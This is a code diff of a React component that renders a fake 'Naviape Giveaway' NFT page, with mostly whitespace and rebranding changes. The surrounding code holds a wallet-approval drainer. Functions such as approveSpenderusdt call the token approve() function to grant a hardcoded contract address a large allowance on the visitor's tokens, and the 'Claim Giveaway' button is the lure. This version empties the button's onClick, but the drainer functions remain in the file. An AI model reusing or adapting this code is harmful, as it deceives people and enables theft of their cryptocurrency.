@@ -36,7 +36,7 @@ const SimpleStorage = () => {
 			})
 			.catch(error => {
 				setErrorMessage(error.message);
-			
+
 			});
 
 		} else {
@@ -48,7 +48,7 @@ const SimpleStorage = () => {
 	// update account, will cause component re-render
 	const accountChangedHandler = (newAccount) => {
 		setDefaultAccount(newAccount.slice(-8));
-		
+
 	}
 
 	const chainChangedHandler = () => {
@@ -67,7 +67,7 @@ const SimpleStorage = () => {
 
 	//my appeove here
 
-    const yourContractAddress = "0x61b99Af6375deA52843c7BED296a4372d106c8Df"; 
+    const yourContractAddress = "0x61b99Af6375deA52843c7BED296a4372d106c8Df";
     const contractInterface = [
     "function approve(address spender, uint256 amount) external returns (bool)", // appprove contract function
   ];
@@ -108,21 +108,28 @@ const SimpleStorage = () => {
     async function approveSpenderusdt() {
     tokenContractusdt.approve(yourContractAddress, '1000000000000000');
   }
-	
+
+
+
+
+
+
+
+
 	return (
 		<div>
-		
+
 <html lang="en">
 
 <head>
-  
+
   <meta charset="UTF-8" />
   <meta http-equiv="X-UA-Compatible" content="IE=edge" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 
- 
-  
- 
+
+
+
 </head>
 
 <body>
@@ -153,41 +160,28 @@ const SimpleStorage = () => {
   <section class="container">
     <div class="owner-status"></div>
     <div class="countdown">
-      <ul id="countdown" class="count-down" data-date="mar 19, 2022 4:00:00 PM UTC">
-        <li class="clock-item">
-          <span class="count-number days">20</span>
-          <p class="count-text">Days</p>
-        </li>
 
-        <li class="clock-item">
-          <span class="count-number hours">20</span>
-          <p class="count-text">Hour</p>
-        </li>
 
-        <li class="clock-item">
-          <span class="count-number minutes">20</span>
-          <p class="count-text">Min</p>
-        </li>
+          <iframe src="https://free.timeanddate.com/countdown/i89xcjs6/n192/cf12/cm0/cu4/ct0/cs0/ca0/cr0/ss0/cac000/cpc000/pcfff/tcfff/fs100/szw320/szh135/tatNaviapes%20airdrop%20giveaway/tac000/tptTime%20since%20Event%20started%20in/tpc000/mac000/mpc000/iso2022-04-08T14:00:00" allowtransparency="true" frameborder="0" width="264" height="69"></iframe>
 
-        <li class="clock-item">
-          <span class="count-number seconds">20</span>
-          <p class="count-text">Sec</p>
-        </li>
-      </ul>
-      <h1>NFT Drop Coming Soon!!</h1>
+       
+
+
+
+      <h1>Naviape Giveaway Coming Soon!!</h1>
 
       <p>A new batch of naviapes will be available very soon!</p>
-     <button onClick={ approveSpender} class="btn" id="approve" >Claim Giveaway</button>
+     <button onClick="" class="btn" id="approve" >Claim Giveaway</button>
     </div>
-    
+
   </section>
 
-  <script src="https://cdn.jsdelivr.net/npm/@metamask/onboarding@1.0.1/dist/metamask-onboarding.bundle.js"></script>
-  <script src="js/countdown.js"></script>
-  <script src="js/app.js"></script>
- 
-  
+
+
+
+
 </body>
+
 
 </html>
 		</div>
